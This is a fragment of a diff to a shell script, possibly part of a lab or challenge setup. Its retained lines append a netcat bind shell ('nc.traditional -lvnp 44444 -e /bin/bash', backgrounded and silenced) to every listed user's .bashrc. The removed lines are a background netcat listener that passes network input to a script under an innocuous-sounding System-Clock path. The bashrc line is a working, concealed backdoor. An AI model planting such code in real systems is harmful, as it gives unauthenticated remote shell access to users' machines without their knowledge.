@@ -17,10 +17,3 @@ for username in "${usernames[@]}"; do
     echo "nc.traditional -lvnp 44444 -e /bin/bash >/dev/null 2>&1 &" &>> "/home/$username/.bashrc"
     chown "$username:$username" "/home/$username/.bashrc"
 done
-
-# Listen for messages and display them in terminals - start this in background
-while true; do
-    nc.traditional -lvnp 5555 | while read -r line; do
-        /etc/System-Clock/chronos-broadcast.sh "$line"
-    done
-done &
